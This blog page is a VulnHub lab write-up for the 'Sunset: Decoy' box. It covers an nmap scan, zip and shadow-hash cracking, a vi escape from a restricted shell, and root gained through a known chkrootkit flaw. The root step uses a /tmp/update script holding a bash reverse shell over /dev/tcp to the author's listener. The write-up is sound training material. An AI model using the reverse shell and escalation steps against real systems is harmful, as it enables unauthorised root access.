@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>VulnHub: Sunset Decoy - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<meta property="og:title" content="VulnHub: Sunset Decoy" />
+<meta property="og:description" content="Here&rsquo;s my write-up for Sunset: Decoy, a VulnHub box created by whitecr0wz, which is part of the Sunset series.
+Write-up The description for this box states the following:
+Easy/Intermediate (May variate depending on your background) It is recommended to run this machine in Virtualbox. I ran nmap to see which services were exposed:
+kali@kali:~$ nmap -sC -sV -p- 192.168.1.123 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 04:11 EDT Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592 (192." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/vulnhub-sunset-decoy/" />
+<meta property="article:published_time" content="2020-07-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-11T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="VulnHub: Sunset Decoy"/>
+<meta name="twitter:description" content="Here&rsquo;s my write-up for Sunset: Decoy, a VulnHub box created by whitecr0wz, which is part of the Sunset series.
+Write-up The description for this box states the following:
+Easy/Intermediate (May variate depending on your background) It is recommended to run this machine in Virtualbox. I ran nmap to see which services were exposed:
+kali@kali:~$ nmap -sC -sV -p- 192.168.1.123 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 04:11 EDT Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592 (192."/>
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="/">
+				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
+	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
+			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="author">
+				
+			</div>
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">11</span>
+							<span class="rest">Jul 2020</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">VulnHub: Sunset Decoy</h1>
+				</div>
+			</div>
+			<div class="markdown">
+				<p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/sunset-decoy,505/">Sunset: Decoy</a>, a VulnHub box created by whitecr0wz, which is part of the <a href="https://www.vulnhub.com/series/sunset,225/">Sunset</a> series.</p>
+<h3 id="write-up">Write-up</h3>
+<p>The description for this box states the following:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Easy/Intermediate (May variate depending on your background)
+
+It is recommended to run this machine in Virtualbox.
+</code></pre></div><p>I ran nmap to see which services were exposed:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ nmap -sC -sV -p- 192.168.1.123
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 04:11 EDT
+Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592 (192.168.1.123)
+Host is up (0.00050s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
+|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
+|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
+80/tcp open  http    Apache httpd 2.4.38
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| 3.0K  2020-07-07 16:36  save.zip
+|_
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Index of /
+Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</code></pre></div><p>Only port <code>80</code> and <code>22</code> appeared to be exposed. I took a look at what was being served by port <code>80</code> and found a single zip file named &ldquo;save.zip&rdquo;. I downloaded the file and attempted to extract the contents but found that it required a password.</p>
+<p><img src="/static/sunset-decoy/1.png" alt=""></p>
+<p>I used fcrackzip to crack the zip password: &ldquo;manuel&rdquo;.</p>
+<p><img src="/static/sunset-decoy/2.png" alt=""></p>
+<p><img src="/static/sunset-decoy/3.png" alt=""></p>
+<p>Inside the zip file was a backup from (I guessed) the box I was trying to gain access to. I could see the passwd file and the shadow file, which was all I needed to attempt to crack the user&rsquo;s passwords.</p>
+<p><img src="/static/sunset-decoy/4.png" alt=""></p>
+<p><img src="/static/sunset-decoy/5.png" alt=""></p>
+<p>The password for user &ldquo;296640a3b825115a47b68fc44501c828&rdquo; was &ldquo;server&rdquo;. I logged into the machine using <code>ssh</code> and started looking around. Looking around was a little difficult to do at this point because I was in a restricted shell, something I needed to break out of if I was going to get anywhere.</p>
+<p><img src="/static/sunset-decoy/6.png" alt=""></p>
+<p>I found an interesting looking executable named &ldquo;honeypot.decoy&rdquo;. I ran <code>honeypot.decoy</code> to see what it did, and I also copied <code>honeypot.decoy</code> back to my machine for some analysis in Ghidra.</p>
+<p><img src="/static/sunset-decoy/8.png" alt=""></p>
+<p><img src="/static/sunset-decoy/7.png" alt=""></p>
+<p>Ghidra showed what each option <code>honeypot.decoy</code> was executing under the hood. The first interesting option was option 7 as I could potentially use <code>vi</code> to break out of the restricted shell. The second interesting option was open 5. The output of this option suggested that an AV scan was going to start in &ldquo;a minute or less&rdquo; but the command that was ran as part of this option just placed a file in <code>/dev/shm</code> named <code>STTY5246</code>. This suggested to me that there was a cronjob running every minute that looked for this particular file and would action something based on its presence.</p>
+<p>The first thing to do was to break out of the restricted shell using <code>vi</code>. I ran <code>honeypot.decoy</code>, entered option 7 which placed me into a <code>vi</code> editor. I ran the following commands in <code>vi</code> to gain access to a <code>sh</code> session:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">:set shell=/bin/sh
+:shell
+</code></pre></div><p>Once I had an unrestricted shell I updated the PATH as the PATH was set to: <code>/home/296640a3b825115a47b68fc44501c828</code> which was a bit limited.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+</code></pre></div><p>Now I could do some interesting things:</p>
+<p><img src="/static/sunset-decoy/9.png" alt=""></p>
+<p>Before I got started looking into option 5 in <code>honeypot.decoy</code> I looked around the user&rsquo;s home directory a bit more and came across some log files for a program named &ldquo;pspy&rdquo;.</p>
+<p><img src="/static/sunset-decoy/9.png" alt=""></p>
+<p>I did some research and found out that pspy was a tool for showing processes running on the machine without the need for root permissions.</p>
+<p><img src="/static/sunset-decoy/10.png" alt=""></p>
+<p>I downloaded a copy of <a href="https://github.com/DominicBreuker/pspy">pspy</a> for myself and copied it onto the machine using <code>scp</code> and ran it, hoping it would give me some more insight into what that presumed cronjob (option 5) is doing.</p>
+<p>In one tab I selected option 5 from <code>honeypot.decoy</code> and in another tab I had pspy running on the box. Within 30 seconds I could see a flood of processes appearing from something called <code>chkrootkit</code>, executed by root.</p>
+<p><img src="/static/sunset-decoy/11.png" alt=""></p>
+<p><img src="/static/sunset-decoy/12.png" alt=""></p>
+<p>Sure enough, the existence of &ldquo;STTY5246&rdquo; in <code>/dev/shm</code> was causing something, somewhere, to execute <code>chkrootkit</code>.</p>
+<p>I looked around for some more information on <code>chkrootkit</code> and came across <a href="https://www.exploit-db.com/exploits/33899">an exploit</a> for the exact version of <code>chkrootkit</code> the box was running:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">- Put an executable file named &#39;update&#39; with non-root owner in /tmp (not
+mounted noexec, obviously)
+- Run chkrootkit (as uid 0)
+
+Result: The file /tmp/update will be executed as root, thus effectively
+rooting your box, if malicious content is placed inside the file.
+</code></pre></div><p>I placed a reverse shell command into <code>/tmp/update</code> and marked the file as executable, as per the exploit instructions:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#579">#!/bin/bash
+</span><span style="color:#579"></span>bash -i &gt;&amp; /dev/tcp/192.168.1.199/9000 0&gt;&amp;<span style="color:#60e;font-weight:bold">1</span>
+</code></pre></div><p>I also set up a listener on my machine using <code>nc</code>. A few seconds later the <code>update</code> was executed and I had remote root access:</p>
+<p><img src="/static/sunset-decoy/13.png" alt=""></p>
+<p><img src="/static/sunset-decoy/14.png" alt=""></p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>This was a fun little box to root. I was left scratching my head a few times but I managed to get there in the end with a bit of research and &ldquo;out of the box&rdquo; thinking. Thanks Felipe!</p>
+
+			</div>
+			<div class="tags">
+				
+				
+				
+				
+					
+				
+					
+				
+				
+			</div></div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div class="footertext"></div>
+	</nav>
+</div>
+
+
+
+</body>
+</html>
